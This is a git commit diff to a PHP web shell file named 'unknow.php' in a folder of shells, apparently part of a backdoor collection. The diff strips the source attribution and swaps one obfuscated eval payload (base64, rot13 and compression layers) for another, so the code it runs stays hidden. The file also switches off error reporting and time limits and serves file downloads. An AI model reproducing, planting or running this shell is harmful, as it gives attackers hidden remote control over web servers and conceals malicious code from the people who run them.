3c7122ef1a508c4abbf156026eaa0895e532b21f
User of Github <84887432+1337r0j4n@users.noreply.github.com>
2024-01-21 21:33:58 +0630

    Add files via upload

--- SHELLs/Unknowsec Shell/unknow.php
+++ SHELLs/Unknowsec Shell/unknow.php
@@ -1,5 +1,5 @@
 <?php
-// from https://github.com/1337r0j4n/php-backdoors
+
 /* Mau recode? izin dulu, recode ga izin itu ga keren ajg */
 set_time_limit(0);
 error_reporting(0);
@@ -12,7 +12,7 @@ date_default_timezone_set('Asia/Jakarta');
 $_n = 'UnknownSec';
 $_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
 $_r = "required='required'";
-$_x = "<i class='bi bi-gear-fill'></i>"; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
+$_x = "<i class='bi bi-gear-fill'></i>"; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
 if(isset($_GET['option']) && $_POST['opt'] == 'download'){
 	header('Content-type: text/plain');
 	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
